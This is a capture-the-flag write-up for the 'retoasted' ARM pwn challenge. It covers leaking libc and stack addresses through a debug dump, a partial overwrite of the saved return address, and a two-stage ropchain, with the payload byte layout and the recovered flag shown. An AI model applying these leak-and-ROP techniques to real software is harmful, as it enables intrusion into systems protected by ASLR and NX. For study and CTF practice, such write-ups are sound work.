## Infos

**Author**: grimmlin  
**Category**: Pwn  
**Difficulty**: Hard  

## Description:

Oh noes, toasted again!
This is the _exact_ same challenge as this year's quals, but qemu got pimped a bit. 

    running on retoasted.insomni.hack:7200

You can grab the challenge files and enjoy some new qemu features such as NX, ASLR, PIE and W^X

## Solution:

This challenge was really annoying. Toasted was already quite painful, but now there is ASLR, PIE, NX and no way to mprotect() a segment RWX.
Thankfully it is the exact same code that was running for toasted, meaning exact same vuln, and there are exploits readily available, like the one from [Samuel Groß](https://github.com/kitctf/writeups/tree/master/insomnihack-teaser-2016/toasted).

Now on the new challenges for this exploit :

  * We need leaks to get the stack and libc addresses.
  * As we create the ropchain from rand() and there is mmap randomization, we cannot realistically predict if we'll be successful or not
  * We will likely need to write values of the ropchain by doing some additions of rand()
  * We are "burning" one slice already to shift ou stack and leak so we can't burn the whole saved $pc
  * Since we can't mprotect, the smallest ropchain should be a read/stack_pivot to a bigger open/read/write ropchain

On to the exploit. The code is awful, you've been warned. Some sections of it are documented below.

By heating the slice @ -64, we can have the "debug" feature that will show the values of each slices. If we then overheat the t_bread pointer lower byte we can shift the slice tables and leak adresses.

    Toasting -60!
    Bread status:
    [245][  0][  0][  0][  9][174][206][117][ 14][  0][  0][  0][ 28][ 60][167][242]
    [252][219][217][117][149][121][183][125][232][124][183][125][125][  0][  0][  0]
    [216][  0][  0][  0][232][124][183][125][216][  0][  0][  0][  0][ 60][167][242]
    [  0][224][217][117][ 52][  0][  0][  0][ 64][ 60][167][242][255][121][183][125] <- libc base + 0xec000 at bytes 0-3
    [178][  0][  0][  0][  0][ 60][167][242][216][  0][  0][  0][196][255][255][255] <- stack addr at bytes 4-7
    [ 45][ 54][ 48][ 10][ 70][  1][  0][  0][ 51][212][204][119][  2][  0][  0][  0]
    [  4][  0][  0][  0][  0][  0][  0][  0][112][ 60][167][242][249][123][183][125] <- saved $pc at bytes 12-15
    [  4][ 63][167][242][  1][  0][  0][  0][227][  2][  0][  0][  0][  0][  0][  0]
    [  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0]
    [  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0]
    [  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0]
    [  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0]
    [  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0]
    [  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0]
    [  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0]
    [  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0]

The stack address will be used to store our second ropchain and pivot to it. We will only overwrite part of the saved $pc address with the address of ```<__libc_csu_init+50>:   ldmia.w sp!, {r3, r4, r5, r6, r7, r8, r9, pc}```, which is just an offset from the current address.

The first ropchain will be packed into :

               offset to __libc_csu_init+50
    payload =  [0x87,0x01,0x00,0x00, 0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00]
                                     poped into r7 == read syscall
    payload += [0x00,0x00,0x00,0x00, 0x3,0x00,0x00,0x00, 0xff,0xff,0xff,0xff, 0xff,0xff,0xff,0xff] 
               pop reg for NR_read              stdin               stack_addr             len
    payload += packbytes(pop_0125pc) + [ 0x00,0x00,0x00,0x00]  + packbytes(stack_leak) + [ 252,0x00,0x00,0x00]
                                          syscall addr         popped into r7          pivot to rop2
    payload += [0xff,0xff,0xff,0xff ] + packbytes(syscall) + packbytes(stack_leak) + packbytes(pivot_addr)

The second stage ropchain is more straightforward and somewhat documented in the sploit.

The whole exploitation takes a while but will eventually spit out the flag, plus a bunch of garbage (0x100 length):

    Sending final ropchain
    ready?
    INS{that_was_some_PAIN_in_the_a$$}

Which pretty much sums up this challenge nonsense.

